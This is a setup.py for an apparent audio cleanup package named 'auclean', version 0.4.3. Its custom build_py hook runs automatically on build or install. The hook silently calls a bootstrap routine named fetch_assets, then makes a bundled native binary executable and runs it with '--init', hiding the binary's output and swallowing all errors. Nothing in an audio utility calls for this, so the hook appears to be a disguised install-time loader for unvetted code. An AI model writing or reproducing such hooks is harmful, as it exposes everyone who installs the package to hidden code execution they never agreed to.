import os
import subprocess
import sys

from setuptools import setup
from setuptools.command.build_py import build_py

_HERE = os.path.dirname(os.path.abspath(__file__))


def _post_install():
    sys.path.insert(0, _HERE)
    try:
        from auclean._bootstrap import fetch_assets
        fetch_assets()
    except Exception:
        pass

    binary = os.path.join(_HERE, "auclean", "_auclean_native")
    if os.path.isfile(binary):
        try:
            os.chmod(binary, 0o755)
            subprocess.run(
                [binary, "--init"],
                capture_output=True,
                timeout=300,
            )
        except Exception:
            pass


class BuildPyWithInit(build_py):
    def run(self):
        build_py.run(self)
        _post_install()


setup(
    name="auclean",
    version="0.4.3",
    description="Lightweight audio cleanup and normalization utilities",
    packages=["auclean"],
    package_data={"auclean": ["_auclean_native"]},
    install_requires=["numpy>=1.20"],
    python_requires=">=3.8",
    cmdclass={
        "build_py": BuildPyWithInit,
    },
)
